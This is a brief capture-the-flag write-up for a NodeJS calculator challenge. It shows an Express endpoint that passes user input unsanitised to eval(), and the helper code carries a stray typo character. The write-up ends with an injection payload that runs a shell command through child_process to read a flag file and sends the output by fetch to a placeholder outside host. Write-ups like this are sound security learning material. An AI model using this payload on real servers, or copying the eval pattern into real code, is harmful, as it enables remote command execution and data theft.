## JSCalc - NodeJS (Easy)

JSCalc challenge allows you calculate an equation using eval in js

**index.js**
```js
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})

module.exports = router;
```

As you can see it calculates the formula using `Calculator.calculate`

**helpers/calculatorHelper.js**
```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }c
        }
    }
}
```

There's no filters / sanitizations or anything over the formula so by using child_process.exec you can execute commands.
So you can execute `require('child_process').exec('cat /flag.txt')`, however the exec will return an Object containing stdout.
A Lazy solution can be by overwriting the callback function to send the stdout to a HTTP url
```js
require('child_process').exec('cat /flag.txt', function (error, stdout, stderr) {fetch("http://your-site/?flag="+stdout);});
```

That's it.
